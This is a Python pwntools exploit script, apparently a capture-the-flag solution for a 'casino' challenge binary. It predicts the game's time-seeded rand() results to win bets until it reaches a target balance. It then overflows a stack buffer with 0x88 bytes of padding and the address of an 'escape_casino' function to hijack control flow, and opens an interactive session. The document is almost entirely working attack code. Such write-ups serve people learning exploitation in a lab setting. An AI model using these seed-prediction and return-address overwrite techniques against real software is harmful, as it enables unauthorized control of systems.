#!/usr/bin/python3
from pwn import *
from sys import argv
import ctypes

e = context.binary = ELF('./casino')
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

libc = ctypes.CDLL("libc.so.6")

p = conn()
libc.srand(libc.time(0))

money = 10
while money < 0x1337133713371337:
    print(hex(money))
    choice = libc.rand() % 37
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Pick your number: ", str(choice).encode())
    p.sendlineafter(b"How much do you want to bet: ", str(money).encode())
    p.recvuntil(b"The wheel has landed on ")
    result = int(p.recvline())
    if choice != result:
        log.error(f"Gussed {choice}, landed on {result}")
        exit(1)
    money *= 36

p.sendlineafter(b"You need to get out of here, and quickly!", b"A"*0x88 + p64(e.sym.escape_casino))
p.interactive()
